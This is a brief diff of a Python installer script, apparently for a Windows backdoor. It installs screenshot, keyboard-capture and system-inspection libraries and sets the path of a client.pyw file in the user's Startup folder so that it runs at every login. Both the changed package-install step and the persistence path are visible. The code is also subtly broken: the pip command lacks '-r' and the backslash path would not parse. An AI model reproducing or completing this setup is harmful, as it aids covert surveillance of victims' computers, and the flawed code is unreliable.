@@ -7,8 +7,6 @@ pythonw_path = 'C:/Users/jan-h/AppData/Local/Programs/Python/Python36/pythonw.ex
 sys.path.append(python_path)
 # sys.path.append(pythonw_path)
 
-pips = ["pywin32", "pyscreeze", "pynput", "WMI", "cryptography", "pillow"]
-
 def run(cmd):
     try:
         out = subprocess.run(
@@ -20,8 +18,7 @@ def run(cmd):
         print(e)
         pass
 
-for cmd in pips:
-    run('{0} -m pip install {1}'.format(python_path, cmd))
+run('{0} -m pip install requirements.txt'.format(python_path))
 
 backdoor_loc = "C:\Users\jan-h\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\client.pyw"
 
